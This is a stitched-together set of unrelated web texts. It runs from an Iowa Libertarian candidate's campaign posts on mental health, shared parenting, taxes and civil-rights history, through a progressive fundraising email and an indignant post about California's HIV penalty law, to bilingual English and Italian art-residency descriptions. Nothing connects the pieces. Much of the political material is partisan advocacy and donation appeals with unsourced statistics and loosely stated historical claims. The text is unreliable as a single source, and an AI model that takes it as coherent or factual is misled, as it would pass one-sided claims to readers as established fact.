The Clubhouse Model of Psycho-social Rehabilitation is a comprehensive and dynamic program of support and opportunities for people with severe and persistent mental illnesses. In contrast to traditional day-treatment and other day program models, Clubhouse participants are called “members” (as opposed to “patients” or “clients”) and restorative activities focus on their strengths and abilities, not their illness. All participation in a clubhouse is strictly on a voluntary basis.
There are four guaranteed rights of membership, which are at the core of the Clubhouse Model:
A right to a place to come; A right to meaningful relationships; A right to meaningful work; and A right to a place to return.
The members and staff of a Clubhouse work side-by-side to manage all the operations of the Clubhouse, providing an opportunity for members to contribute in significant and meaningful ways; therefore, a Clubhouse is operated in a partnership model with members and staff working side-by-side as colleagues. The Clubhouse Model seeks to demonstrate that people with mental illness can successfully live productive lives and work in the community, regardless of the nature or severity of their mental illness. I believe that it would do wonders for people to have access to this model in every community in Iowa. A year of Clubhouse rehabilitation is akin to two years under hospital care. The Clubhouse Model has proven to reduce incarcerations, reduce hospitalizations and recidivism, and it is cost effective compared to the other existing mental health care approaches. I think we need to adjust the way that we fund mental health to better align with this model. I see it as very realistic that with some start-up help from state and local government clubhouses could take off all over the state and work towards independence from state funds.
Please check out www.passagewayiowa.org when you have a chance. They would be happy to give you a tour whether you are a candidate running for office or you are just interested in the Club House model. I am actually raising money for Passageway and you can donate to support the Club House Model at this link. Marco Battaglia’s fundraiser for Passageway and the Club House Model of Mental Health Rehabilitation.
I recently sat down with a citizen concerned with the mental health crisis in Iowa. He was open about his own struggles. We decided to film our first in person meeting and conversation.

Families United Action Network in Support of Shared Parenting Bill – SSB 3154
On Tuesday, a Senate Subcommittee meeting was held to discuss SSB 3154, a bill that would create a rebuttable presumption of equal shared parenting in child custody cases. I spoke as an associate of the organization Families United Action Network in support of this bill.
Currently, when divorcing parents walk into a courtroom, it is assumed that one parent will “win” and one parent will “lose” custody of the couple’s children. This societal standard has left generations of people suffering emotional turmoil all of their lives. According to fatherhood.org, children without their fathers are twice as likely to drop out of school and seven times more likely to become teen parents. They are more likely to abuse drugs and alcohol and suffer poverty. I cannot overstate the importance of a child’s own father in their lives.
These heavy statistics are painful to accept when I look at my step children. My family is a blended one, where my husband and I both have children from previous marriages, as well as our own. I ache for my husband’s children each time they hug their sobbing siblings goodbye for yet another long absence. Four days per month is not enough time to create family memories, enjoy hobbies, and impart important values. What good reason is there for two empty seats at the dinner table most nights? Their mother does not wish to share parenting and fought their father vigorously in order to keep him devalued as merely a visitor in their lives.
I have another perspective to offer, that is as a mother who does share parenting, disregarding our divorce papers to do so. My two teenage children have enjoyed living as equally as possible with their father and myself for the entire ten years we’ve been divorced. Well-adjustment in having both parents involved in their daily lives is obvious. Their father and I have each had the opportunity to build meaningful relationships with our kids, offer emotional stability and maintain trust. Shared parenting works. My children wouldn’t have it any other way.
My ex-husband and I are far from friends. It’s a misconnection that shared parenting to work requires there be no conflict. Shared parenting does require maturity and cooperation, which can learned over time after the pain of a separation. Resources exist to help high-conflict situations, such as apps like My Family Wizard, which aid communication between parents. Money spent fighting in ugly litigation for control could be spent instead on counseling to learn better co-parenting skills. In the long run, two divorced parents learning to co-parent, sharing equally in the lives of their children, without one parent being the “loser” and “visitor” is certainly in the best interest of children.
But you don’t have to take my word for it. Dr. Linda Nielsen, a professor of Adolescent and Educational Psychology at Wake Forest University, agrees with over 110 other social science experts and has reviewed at least 54 studies that overwhelmingly show that “children in shared physical custody families—with the exception of situations where children need protection from an abusive or negligent parent—have better outcomes across a variety of measures of well-being than do children in sole physical custody.”
Don’t let another generation of kids grow up missing half of their families. Don’t let another generation of kids become prizes to be won in a war where they can only lose. I urge our legislators to pass a rebuttable presumption of equal shared parenting bill so that the next generation of Iowa’s children, who must endure a divorce or separation, can maintain strong familiar bonds that will benefit them for a lifetime.

Marco Battaglia’s response to the Governor’s Condition of the State
Condition of the State Response
January 19, 2018
Marco Battaglia
Iowa is in dire need of Comprehensive Tax Reform
Governor Renyolds said that she wants to lower taxes but she has been hesitant to say what exactly her plan is. I’ve heard politicians from the right and left of me say my whole life that they were going to lower taxes. Studying the past administrations in Iowa I’ve heard these promises and this debate ongoing throughout the previous century. I am willing to say right now that my tax plan works to eliminate the income tax entirely while reducing property taxes for all Iowans. Instead of using the markets that we are working to open up, to spend more of your money, I want to use them to systematically decrease the size of Iowa Government and to simplify and reduce taxation for all Iowans; Not just ones that participate with my political party, that donate to my campaign, or that belong to a specific tax bracket.
Iowans need and deserve real solutions not “Reynolds-Care”
The Governor has doubled down saying that she believes in the current crony capitalism regarding the state’s medicaid. This is not a classic republican or a classic liberal position nor is it the right thing for Iowans at this time. I believe that true free market solutions will not leave the most vulnerable Iowans without assistance. There is this unfounded fear mongering about Libertarians that we would not look out for special needs or low income individuals and I am running in part to show that this could not be further from the reality. My platform actually works to restore access to services in regards to mental health, special needs, and low income peoples. It is my belief that that we can work to move towards a much freer market without making haphazard and dangerous cuts that effect these peoples and their loved ones.
I believe that Bill Dix should resign.
In regards to Majority Leader of the Iowa Senate Bill Dix I will go as far as to say that he needs to step down. Bill Dix, I am asking you to step down. I think that you should resign immediately. A majority of us that come from the private sector would be fired if we would have handled such behavior in our workplace in this manner.
Spending more and more money for worse and worse results?
Governor Reynolds said that we invested in our kids at a record level, committing $735 million more for education since 2011. Reynolds also said that over the last 10 years, only three states increased education funding at a higher rate than Iowa. I am not proud of this. The state’s growing contributions to K-12 don’t translate dollar-for-dollar to districts’ budgets. For decades—and as recently as 1992–Iowa students either led the nation in student achievement or were right at the top of the pack. The Iowa Tests of Basic Skills began, not surprisingly, right here in Iowa. So did the ACT assessment. No state can afford to be self-satisfied and to perpetuate the status-quo and I am afraid to say that our administrations since have done just that. Over the last two decades, Iowa has stagnated educationally. Many states, and even other nations, are now outperforming Iowa. I beseech the Governor to take a look at the fact that Iowa is the only state in the nation that hasn’t made significant progress in early math education since 1992. Iowa now ranks in the bottom ten states in the percentage of high school seniors who take and pass an Advanced Placement course.
I believe arguments that more English as a second language students, or that more poor students, play a role in this, are entirely bogus. More than 80 percent of Iowa’s students are still white kids that were raised knowing English only–and these students are no longer among the best in the nation. In fact, reading scores for non-poor, white students in Iowa on the NAEP assessment are now below the national average for their peer group. Students in 29 U.S. states are more likely to be advanced in math than these students in Iowa. And all students in 30 nations and provinces are more likely to be advanced math students than just these students in Iowa. In the knowledge economy, that is not nearly good enough–because Iowa students are no longer competing just against their peers in their community or in their state. They will be competing with students for jobs and admission to higher education with students from places like China, South Korea, Canada, India, and Russia. I actually believe that being bi or multi-lingual is an amazing thing for children to be and actually an early indicator that one is going to grow to be very intelligent. I need everyone that wants to participate to consider what kind of return we are getting on our investments here? Are there true school choice and free market solutions that could move us in a better direction at a much lower cost? Is there any excuse for a child with educated guardians and connection to the internet not to have access to a world class education in the year 2018?
I believe that Iowans should be able to set their own high bar in terms of education standards. State and local governments should be able to lead the way on raising standards, measuring and supporting teacher and leader effectiveness, re-evaluating the skills that children are taught, and closing achievement gaps. Iowans need the freedom to be leaders in implementing innovation to increase and improve learning. Iowa has one of the weakest charter school laws in the nation, limiting educational flexibility and experimentation. Iowans need true alternative certification programs and options for true competition, creating incentives for teachers or else we will continue to export our top talent to other states and other countries. Reynolds was right that the state’s contribution to K-12 education has increased by about $735 million since 2011 and she was right that over the last 10 years, only three states increased education funding at a higher rate than Iowa, but I would not use these items as a bragging points myself. A vast majority of Iowans believe that every child in all parts of Iowa should have access to quality education. I believe that my vision is best suited to ensure us a path there and that it ensures that we are improving on education for years to come. I believe that we can work smarter to improve education and actually save significant amounts of our money while returning Iowa to being a state that churns out people with world-class educations and skills.
Make Mental Health A Priority
Governor Reynold’s actually had the nerve to brag about the status of Mental Health Care in Iowa during her address. Perhaps if she was at the Gubernatorial mental health forum that I attended, she would have heard what Iowan’s think about the state of mental health care in Iowa. I don’t see how she could feel positive about being complicit in the direction that we having been going for decades on mental health in Iowa. I believe so strongly in my medical freedom platform that I am willing to say that it will not only increase care access to levels never before seen in Iowa but that it will draw top mental health professionals from all over the world to Iowa.
End the War on People
Not only was Kim Reynolds inaccurate with her numbers in regard to opioids during her address but why does she or any other elected official even bother to keep talking about them without addressing solutions to the problems? My medical freedom platform works to end the war on drugs so that addicts can ask for and receive help in lieu of fines, imprisonment, criminal records, and forced labor. It gives those that need pain relief alternatives to opioids if they choose them. This gives medical and public safety professionals affordable access and the ability to use life saving measures in every instance of opioid overdose. Under my vision officers of the law, legal, and medical professionals will all be able to focus on the violent crimes that are going on in Iowa. By expunging the records of those charged with non violent drug crimes we will return many people to the workforce and allow many Iowans to work their way up the economic ladder.
Give Iowans their land back
I understand that a Governor is unable to touch on everything in such an address but I must say that I am also disappointed that the Governor did not touch on opening up new markets for Iowa farmers such as hemp and raw dairy, and with how did she did not address the pressing pollinators, soil, and water quality issues.

The Iowa Free Press Reflects on MLK JR DAY 2018
“Injustice anywhere is a threat to justice everywhere. We are caught in an inescapable network of mutuality, tied in a single garment of destiny. Whatever affects one directly, affects all indirectly. Never again can we afford to live with the narrow, provincial “outside agitator” idea. Anyone who lives inside the United States can never be considered an outsider anywhere within its bounds.”
“I would be the first to advocate obeying just laws. One has not only a legal but a moral responsibility to obey just laws. Conversely, one has a moral responsibility to disobey unjust laws.”
“Sometimes a law is just on its face and unjust in its application. For instance, I have been arrested on a charge of parading without a permit. Now, there is nothing wrong in having an ordinance which requires a permit for a parade. But such an ordinance becomes unjust when it is used to maintain segregation and to deny citizens the First-Amendment privilege of peaceful assembly and protest.”
Taken from
“Letter from a Birmingham Jail [King, Jr.]”
Last year we talked about the power of boycott and the right that we all have to peaceful protest. This year I thought that we would talk about individual liberty. The most damned, banned, excluded, condemned, forbidden, ostracized, ignored, suppressed, repressed, robbed, brutalized and defamed of all ‘Damned Things’ is the individual human being. No one can, nor should, ever take away from a persons struggle. I simply find that for the declaration of independence, the constitution, and the bill of rights, to be worth the paper that they are printed on, that they must apply to everyone in their bounds. In 2018 I see similarities in the plights of every type of minority. Religious minorities, homeless of every color, racial minorities, lgbtq peoples, refugees, immigrants, ect. ect. As we are finally in a position to ensure that the founding beliefs of this country apply to all within our bounds, I am reminded that Dr. King was more upset not with those that commit aggressions but with those that stood by idly and did nothing.
Iowa has played a prominent role in the civil rights movement going all the way back to the beginning. Dred Scott, whose legal fight for freedom was ruled on in the 1857 Dred Scott Decision of the United States Supreme Court, lived with his family in Davenport as he followed his master to various military postings in the Midwest. Scott and his wife based their appeal for freedom on the fact that they had been held for extended periods of time in free states and territories, including Scott’s stay with his master in Davenport in 1834-36. An historic plaque was installed at the site of Scott’s residence in Davenport. African Americans fleeing both slavery and the Civil War came to Davenport because it was a major port in a free territory on the Mississippi River. Though I am still greatly inspired by reading Dr. King’s writing, this year I thought that we would look at some of his peers that helped make the world a better place for those of us that were yet to be born.
Sister Rosetta Tharpe
Sister Rossetta Tharpe influenced Martin Luther King Jr, Johnny Cash, Bob Dylan, Elvis Presley, Little Richard, Aretha Franklin, Chuck Berry, Eric Clapton, Jeff Beck, Keith Richards and Brian Jones, to name a few personages of historical significance. Robert Plant even immortalized her in a song of his own. I would say that it is tough to hear a popular song that is not influenced by someone that she influenced. Encouraged by her mother, Tharpe began singing and playing the guitar as Little Rosetta Nubin at the age of four and was cited as a musical prodigy. She rocked the Gibson SG before Angus and Tony and she also sang while doing so. Tharpe defied religious, gender, and race roles as they were and are typically depicted during her lifetime. Her performances both shocked and awed the crowds, and were controversial as well as revolutionary in several respects. At the time performing gospel music for secular nightclub audiences and alongside blues and jazz musicians and dancers was all but unheard of. You don’t exactly have to be Marty McFly to watch surviving footage of her and experience how far out she actually was. She could and did outplay many men of the time exemplifying her skills at guitar battles at the Apollo. Tharpe toured around the world representing a nation that she proved could be tolerant, caring, and a global leader in civil and human rights. Tharpe continued recording during World War II, one of only two gospel artists able to record V-discs for troops overseas.
James Farmer
James Farmer served along MLK JR as a civil rights activist and leader. He also pushed for nonviolent protest to dismantle segregation. He was the initiator and organizer of the 1961 Freedom Ride, which eventually led to the desegregation of interstate transportation in the United States. Farmer was a child prodigy; as a freshman in 1934 at the age of 14, he enrolled at Wiley College, in Marshall, Texas. He was selected as part of the debate team. At the age of 21, Farmer was invited to the White House to talk with President Franklin D. Roosevelt. Eleanor Roosevelt signed the invitation. Before the talk with the president, Mrs. Roosevelt talked to the group. Farmer took a liking to her immediately, and the two of them monopolized the conversation. When the group went in to talk to President Roosevelt, Mrs. Roosevelt followed and sat in the back. After the formalities were done, the young people were allowed to ask questions. Farmer said, “On your opening remarks you described Britain and France as champions of freedom. In light of their colonial policies in Africa, which give the lie to the principle, how can they be considered defenders?” The president tactfully avoided the question. She exclaimed, “Just a minute, you did not answer the question!” Although the president still did not answer the question as Farmer phrased it, Farmer was placated knowing that he had gotten the question out there. Farmer earned a Bachelor of Science at Wiley College in 1938, and a Bachelor of Divinity from Howard University School of Religion in 1941. At Wiley, Farmer became anguished over segregation, recalling particular occasions of racism he had witnessed or suffered in his younger days. During the Second World War, Farmer had official status as a conscientious objector. Inspired by Howard Thurman, a professor of theology at Howard University, Farmer became interested in peaceful protest. Martin Luther King Jr. also studied this later and adopted many of its principles. Farmer started to think about how to stop racist practices in America while working at the Fellowship of Reconciliation, which he joined after college.
Hosea Williams
Also depicted in the photo of King on the balcony the day before his death is Hosea Williams. Williams was arrested 125 times for his militant acts of defiance while working in service to the civil rights movement. Perhaps his passion for civil rights was a direct consequence of his having been beaten so severely he was hospitalized for five weeks because he had a drink at a “whites-only” bar. Not nearly as well known as King or Jackson, Williams nevertheless was a major figure in the civil rights movement with several triumphs to his credit. Because of his efforts, Savannah, Georgia, was the first city to ban “whites-only” lunch counters. He also led a march against the Klu Klux Klan in 1987 and won a $950,000 jury award after suing Forsyth County. He later became a senator.
Harry Belafonte
Actor, singer and activist Harry Belafonte has achieved lasting fame for such songs as ‘The Banana Boat Song (Day-O),’ as well as for his film and humanitarian work. Always outspoken, Belafonte found inspiration for his activism from such figures as singer Paul Robeson and writer and activist W.E.B. Du Bois. After meeting civil rights leader Martin Luther King Jr. in the 1950s, the two became good friends, and Belafonte emerged as a strong voice for the movement. He provided financial backing for the Student Nonviolent Coordinating Committee and participated in numerous rallies and protests. Belafonte helped organize the 1963 March on Washington, in which King delivered his famous “I Have a Dream” speech, and met with the civil rights leader shortly before he was assassinated in 1968.
Moses Fleetwood “Fleet” Walker
Moses Fleetwood Walker was an American professional baseball catcher who is credited with being the first openly black men to play in Major League Baseball (MLB). Walker was born in 1856 in Mount Pleasant, a working-class town in Eastern Ohio that had served as a sanctuary for runaway slaves since 1815. Its population included a large Quaker community and a unique collective of former Virginian slaves. He was also a businessman, a newspaper publisher and a scholar. He received patents for artillery shells and motion-picture devices. He wrote a book on race relations. Many people know of Jackie Robinson and it is well documented that the two ball players endured their own trials with racism in baseball. While both breaking barriers, Robinson went on to become good friends with Dr. Martin Luther King Jr. Not satisfied with his work on the diamonds, Robinson became even more involved in the civil rights movement after he retired in 1957. When King gave his righteous and impassioned address on the steps of the Lincoln Memorial on Aug. 28, 1963, Dodgers great Jackie Robinson stood just feet away, looking on with his children.
Kenny Washington
https://www.youtube.com/watch?v=7GstE32yLhU
Jackie Robinson and Kenny Washington stood shoulder-to-shoulder on the athletic fields of UCLA, as both excelled at football and baseball. Washington broke the NFL’s modern-era color barrier as a member of the Los Angeles Rams in 1946. What Kenny had to go through from his peers was in some ways harder than what Jackie Robinson had to endure. You could dodge a ball in baseball. But the Rams handed him the ball. One time in a game against the Washington, the players held him down, piled on top and put chalk in his eyes. Washington actively participated in politics.
Bill Russell
In 1950 Chuck Cooper became the first black player to be drafted when he was chosen by Boston; Nat “Sweetwater” Clifton became the first to sign an NBA contract when he signed with New York, and Earl Lloyd became the first to play in an NBA regular-season game because the schedule had his Washington team opening one day before the others. NBA legend Bill Russell was feet way from MLK JR. as he gave his “I Have A Dream Speech.” Russell was the in the middle of his legendary career — he had five championships and three MVPs at that point — and his presence helped some understand the need for equality that extended from buses to restaurant counters all the way to the basketball court. Russell lended his presence to the civil rights movement on multiple occasions.
Gil Scott-Heron
Gil Scott-Heron was an American soul and jazz poet, musician, and author, known primarily for his work as a spoken-word performer in the 1970s and 1980s. His collaborative efforts with musician Brian Jackson featured a musical fusion of jazz, blues, and soul, as well as lyrical content concerning social and political issues of the time, delivered in both rapping and melismatic vocal styles by Scott-Heron. His own term for himself was “bluesologist”, which he defined as “a scientist who is concerned with the origin of the blues”. His music, most notably on Pieces of a Man and Winter in America in the early 1970s, influenced and helped engender later African-American music genres such as hip hop and neo soul. In fact, Scott-Heron himself is considered by many to be the first rapper/MC ever, a recognition also shared by fellow American MC Coke La Rock. Scott-Heron remained active until his death, and in 2010 released his first new album in 16 years, entitled I’m New Here. A memoir he had been working on for years up to the time of his death, The Last Holiday, was published posthumously in January 2012. In an extract from this memoir written the year before he passed , Gil Scott-Heron talks about when he toured with Stevie Wonder to establish Martin Luther King Day as a national holiday in the US.

Retraction of the Millennium
November 15, 2013
Previously in the Harrisburg Patriot & Union:
We pass over the silly remarks of the President. For the credit of the nation we are willing that the veil of oblivion shall be dropped over them and that they shall be no more repeated or thought of.
Yesterday, same newspaper:
We write today in reconsideration of "The Gettysburg Address"….
The Patriot-News regrets the error.
Now under new management, of course.

When SuperPACs Attack Our Friends
By Mike Hersh · June 27, 2016
27
June 2016
We need your help right now! Your support will help Progressive Democrats of America (PDA) and Keith Ellison counteract newly-released misleading smears funded by right wing billionaires. Will you step up now? Please pitch in $500, $50, $5 or whatever you can now to help Keith Ellsion fend off these attacks.
When I hear the name Keith Ellison, several words come to mind: intelligence, integrity, good humor, passion, leadership, and most of all courage. Sometimes that courage comes at a cost. Because he's been such a powerful voice for justice, powerful interests have targeted Keith.
Can Keith Ellison Count On You?
PDA will always stand with our friend Keith Ellison. When a FOX personality attacked him a few years back, we were there. Now that shadowy right wing billionaires have set their sites on Keith, we need to step up again. Please donate generously to help Keith Ellison fend off dishonest attacks from Sheldon Adelson's and the Koch Brothers' Super PACs.
Congressperson Keith Ellison and I go back a little ways. He was the first Muslim elected to serve in the U.S. Congress, and I was there on Capitol Hill when he took his oath of office for the first time with his hand on Thomas Jefferson's Holy Qu'oran. Currently a co-chair of the Congressional Progressive Caucus (CPC), Keith is still a trailblazer and a one-of-a-kind leader. Please dig deep to show Keith you have his back. Pitch in $500, $50, $5 or whatever you can now to help Keith Ellsion fend off these attacks.
When I welcomed Keith to our first Progressive Central People's Convention in Denver in 2008, Keith refused to take a Healthcare Not Warfare sticker until I explained the Healthcare part referred to Single Payer / Medicare for All. He said anything else is just *expletive*. He is every bit as outspoken now. I am proud to say I was there at Busboys and Poets when Tim Carpenter welcomed Keith to PDA's Advisory Board, and when Keith introduced the Robin Hood Tax legislation at our Progressive Central events in Charlotte, NC in 2012. When he spoke out strongly against the TPP more than once at our Round Table meetings on the Hill, I was there too.
When I needed advice and insights on helping our other Advisory Board members craft legislation, Keith provided it. Whenever we ask Keith to help, he never hesitates. Now, he needs our help more than ever. Keith never stops speaking up for us. He's serving on the Democratic Party Platform Committee right now, demanding progress on the most important policies. Show him you appreciate his powerful advocacy with a generous contribution. Please pitch in $500, $50, $5 or whatever you can now to help Keith Ellsion fend off these attacks.
We will never raise as much money as far-right billionaires like the Koch Brothers and Sheldon Adelson can pour into their dishonest Super PAC attack ads. Fortunately, we don't have to. But we do need your generous help right now to help Keith refute the dishonest attacks. Give whatever you can afford right now to help Keith Ellison and PDA keep championing the issues you care about most! Please pitch in $500, $50, $5 or whatever you can now to help Keith Ellsion fend off these attacks.
In solidarity,
Mike Hersh for Donna, Judy, Mike F, Janis, Deb, Kim, Steve, and Conor–PDA's National Team!
P.S. A special favor: if you're a delegate, please contact Mike Fox to participate in our discussions and planning ASAP. Please click here now for Progressive Central tickets, tabling, sponsorships, ads, etc. We'll be holding discussions, panels, workshops and more July 25-27. If you can't make it, please donate now to help us make the People's Convention a huge success!
Remember: This movement is far from over. In fact, with your continued involvement, we're just getting started! If you can't make it, please donate now to help us make the People's Convention a huge success! Contact Mike "Phone Guy" Fox to make important calls! Too busy to volunteer? Then contribute $500, $50, $5 or whatever you can now to keep us organizing and mobilizing!

California’s governor, Jerry Brown, passed a bill that now makes it misdemeanor instead of a felony for anyone who knowingly infects another with HIV through sexual contact. And he has even made it okay for people with HIV to donate blood.
WHAT??!!!!
Whew! This man needs to go... yesterday!
Quote: California’s governor, Jerry Brown, on Friday signed a law that lowers the penalty for exposing partners to HIV from a felony to a misdemeanor, which includes those who donate blood without informing the center about their HIV status.
“Today California took a major step toward treating HIV as a public health issue, instead of treating people living with HIV as criminals,” Sen. Scott Wiener, D.- San Francisco, told The Los Angeles Times.
Exposing a person to HIV was treated more seriously under California law than infecting someone with any other communicable disease, a policy some lawmakers said was a relic of the decades-old AIDS scare that unfairly punishes HIV-positive people based on outdated science.
Under the old law, if a person who knows they are infected with HIV has unprotected sex without telling their partner they have the virus, they can be convicted of a felony and face years of jail time. Intentional transmission of any other communicable disease, even a potentially deadly condition like hepatitis, is a misdemeanor.
“These laws were passed at the height of the HIV/AIDS epidemic when there was enormous fear and ignorance and misinformation around HIV,” Wiener earlie said. “It’s time for California to lead and to repeal these laws to send a clear signal that we are going to take a science-based approach to HIV not a fear-based approach.”
Republican lawmaker, Sen Joel Anderson, reportedly voted against the bill.
“I’m of the mind that if you purposefully inflict another with a disease that alters their lifestyle the rest of their life, puts them on a regimen of medications to maintain any kind of normalcy, it should be a felony,” Anderson said, according to the paper.

The Cool Couple
L0rd$ of Ch4o$
We usually find ourselves in great difficulty when we’re asked to make a choice. At the restaurant, we are always the last to order food. And we become practically paralysed if faced with a huge archive of 3D models. As occasional tourists in the realm of 3D scans, and with almost no skills in handling them, we browsed like children wanting to ride their new bicycle through the hundreds of statues, relics, artworks and weapons… but these kids feel afraid to abandon the tricycle.
Democratisation in the means of production and circulation of images means that today one can find a tutorial for almost anything online. Images, already ambiguous in essence, are now more unpredictable than ever, they roam the internet and their consumption often transforms into acts of appropriation. Something uploaded instantly acquires the potential of a loose cannon, like the fate of the graphic novel character Pepe the Frog, now a protagonist of the alt-right meme extravaganza. But this feature isn’t typical of our time. After the fall of the Roman Empire, tales still live to describe the disturbing relations between humans and artworks, witnesses of these artefacts telling us how these affected society at the time, centuries after their context has vanished. Why not bring these objects back to existence? Why not allow them exit the museum and take on new life, to interact with people and maybe affect them somehow?
For our residency, we will attempt to put a selection of artefacts back to work. Considering our present and the looming apocalypse that awaits us, we decided to work with artefacts connected to collective rites and symbols of death, conflict and the end of the world. We are putting them back into play, allowing them to reappear on Earth and bring unqualified chaos. How? Entering the most profitable entertainment product ever: GTA V which already depicts a dystopic alternative present, where the mayhem is intentionally produced by players. Modding the game, we’ll try to use the 3D models as active characters, vehicles or weapons. If it works, the patch will be freely available to all PC users with GTA V to use and play with our models as they wish.

Di solito ci troviamo in grande difficoltà quando ci viene chiesto di fare una scelta. Al ristorante siamo sempre gli ultimi a ordinare da mangiare.E diventiamo praticamente paralizzati se ci troviamo di fronte ad un enorme archivio di modelli 3D. In quanto turisti nel regno delle scansioni 3D, e con quasi nessuna abilità nel maneggiarli, abbiamo navigato come bambini che vogliono fare giri in bicicletta attraverso centinaia di statue, cimeli, opere d’arte e armi…. ma questi bimbi hanno paura di abbandonare il triciclo.
La democratizzazione dei mezzi di produzione e circolazione delle immagini fa sì che oggi si possa trovare un tutorial per quasi tutto online.Le immagini, già ambigue nella sostanza, sono oggi più imprevedibili che mai, girovagano l’internet e il loro consumo si trasforma spesso in atti di riappropriazione.Qualcosa che viene caricato acquisisce istantaneamente il potenziale di una mina vagante, come il destino del personaggio del fumetto Pepe the Frog, ora protagonista della stravaganza dei meme alt-right. Ma questa caratteristica non è tipica del nostro tempo. Dopo la caduta dell’Impero Romano, i racconti vivono ancora oggi per descrivere le inquietanti relazioni tra l’uomo e le opere d’arte, testimoni di questi artefatti che ci raccontano come questi abbiano influenzato la società del tempo, secoli dopo la sparizione del loro contesto. Perché non rianimare questi oggetti? Perché non farli uscire dal museo e prendere nuova vita, farli interagire con le persone?
Per la nostra residenza, cercheremo di rimettere al lavoro una selezione di artefatti. Considerando il nostro presente e l’apocalisse incombente che ci attende, abbiamo deciso di lavorare con artefatti legati a riti collettivi e simboli di morte, conflitti e fine del mondo. Li stiamo rimettendo in gioco, permettendo loro di riapparire sulla Terra e portare un caos senza riserve. Come? Entrando nel prodotto di intrattenimento più redditizio mai prodotto: GTA V, che già illustra un presente alternativo distopico, dove il caos è prodotto intenzionalmente dai giocatori. Modellando il gioco, cercheremo di utilizzare i modelli 3D come personaggi attivi, veicoli o armi. Se funziona, il patch sarà disponibile gratuitamente a tutti gli utenti con PC e GTA V per utilizzare e giocare con i nostri modelli a loro piacimento.

Patrick Hough
Limestone is a hard organic or chemical sedimentary rock that most commonly forms in clear, warm, shallow marine waters or lakes. As a material it is full of ghosts – ancient and unknowable biologies and organic matter contained within. It has been used for some of the worlds most important historical works of mythological imagining, from the Great Sphinx and pyramids of Giza to the Venus of Willendorf.
Throughout the month, Patrick Hough will look at 3D scans of limestone sculptures of these chimeric mythological beings as an entry point to think about the inherent qualities of the geological material that is limestone itself. He will use the geology of limestone to think through ideas of the chimera and the hybrid as way through our current moment of ecological crisis in the geological age of the Anthropocene.
On the precipice of ecological collapse in these ghostly visions of both sculpture mythic beings and raw geological material we see a potential future reflected – we are presented with the possibility that we are another lost civilisation that engineered their own demise – we are the fossils of the future.
Patrick Hough (b.1989, Galway, Ireland) lives and works between London and Dublin. Incorporating moving image, photography and installation, Hough’s work explores the relationship between cinema, technology and museology through an archive of historical film props. He is currently working on a new cinematic film in which an Irish bog body returns to life. Connecting urgent questions surrounding climate change, extraction practices and human hybridisation, the film explores our transforming our relationship with history in the age of the Anthropocene.
Il calcare è una roccia sedimentaria dura, organica o chimica, che si forma più comunemente in acque marine chiare, calde e poco profonde o in laghi. Come materiale è pieno di fantasmi – biologie antiche inconoscibili e materia organica contenuta al suo interno. E stato utilizzato per alcune delle più importanti opere della mitologia, dalla Grande Sfinge e le piramidi di Giza alla Venere di Willendorf.
Per la sua residenza, Patrick Hough utilizzerà delle scansioni 3D delle sculture di questi esseri mitologici chimerici prodotte in pietra calcarea come punto di ingresso per riflettere sulle qualità intrinseche del materiale geologico che è il calcare stesso. Utilizzerà la geologia della pietra calcarea per pensare alla chimera e l’ibrido come potenziale modo di affrontare il nostro attuale momento di crisi ecologica nell’era geologica dell’Antropocene.
Sul precipizio del collasso ecologico in queste visioni spettrali sia di esseri mitici della scultura che di materiale geologico grezzo vediamo un potenziale futuro riflesso – ci viene presentata la possibilità che siamo un’altra civiltà perduta che ha costruito la propria scomparsa – siamo i fossili del futuro.
Patrick Hough (nato nel 1989 a Galway, Irlanda) vive e lavora tra Londra e Dublino. Incorporando immagini in movimento, fotografia e installazioni, il lavoro di Hough esplora il rapporto tra cinema, tecnologia e museologia attraverso un archivio di oggetti di scena storici. Attualmente sta lavorando a un nuovo film cinematografico in cui un corpo paludoso irlandese torna a vivere. Mettendo in relazione questioni urgenti riguardanti il cambiamento climatico, le pratiche di estrazione e l’ibridazione umana, il film esplora il nostro rapporto con la storia nell’era dell’antropocene.

DITTO
Behind a drapery rests a tired body, we don’t see its face, we don’t understand its figure.
We are attracted to what we don’t understand.
We are attracted to objects that have a removed or apparent absence of meaning.
We transform and fetishise representations of singularity, the exotic, the unexpected.
Woman under a sheet, a 3D scan from the Ny Carlsberg Glyptotek, as is hinted by its name, is a statue depicting a female subject completely covered by a veil. The absence of information of this online artefact is precisely what drew DITTO to this mysterious object: apparently anonymous, with no author and no immediate data regarding its historical period.
DITTO moves on the inside of this void, reflecting on the nature and the conditions of these museum artefacts, deprived of their original context by exasperating their de-contextualized status. The art works are purged of their past, the original materials become perfect white digital matter, onto which new stories can be rewritten. The digital object becomes malleable once again, available to all and claiming to be universal, the uniqueness of the objects and their origin no longer matter. In 3D language, textures both cover and negate the form, the body becoming empty, a shell.
DITTO’s residency begins with a determinate: 3D scanning a series of objects found on the street covered by cloths. In the passage of the real to the virtual DITTO dwells on the idea of form, transformation and alterity tied to the covered object.
DITTO is a collective born in 2016 with the intention of creating a fluid dialogue between various practices unifying them as a singular voice. With a pull towards acceleration and the multiplication of images that transform into sedimentary matter, the collective positions itself as an archaeologist operating in various exhibition spaces. DITTO reflects on the impact of digital technology highlighting the ways in which these are remodelling our societal structures and cultural patterns. DITTO is a metaphorical entity that weaves itself in the concave mould of the contemporary in order to restitute its form.
Dietro ad un panneggio riposa un corpo stanco, non ne vediamo il volto, non ne capiamo il corpo.
Siamo attratti da ciò che non capiamo.
Siamo attratti da oggetti che possiedono una rimozione o apparente assenza di significato.
Trasformiamo in feticcio ciò che rappresenta la singolarità, l’esoticità, l’inatteso.
Woman under a sheet, oggetto 3D scansito dalla collezione del Ny Carlsberg Glyptotek, come si coglie dal nome, è una statua che raffigura un corpo femminile completamente coperto da un velo. Ditto è attratto dall’assenza di informazioni su questa scultura, la quale risulta apparentemente anonima, senza autore, e senza dati immediati sul suo periodo storico.
DITTO si muove all’interno di questi spazi virtuali, riflettendo sulla natura e sulla condizione di alcuni oggetti museali sottratti al tempo e trasformati in feticci. La trasformazione delle opere d’arte in oggetti 3D modellabili e inseriti all’interno di un archivio online, esaspera la loro decontestualizzazione.
Le opere vengono spogliate dal loro passato, il materiale originale diventa materia digitale bianca, perfetta, sulla quale si possono riscrivere nuove storie. L’oggetto digitale, ritorna malleabile e alla portata di tutti, pretende di essere universale, non ne importa l’origine né l’unicità. Nel linguaggio 3D la texture esterna ricopre e nega allo stesso tempo la forma, il corpo diventa così vuoto, un guscio.
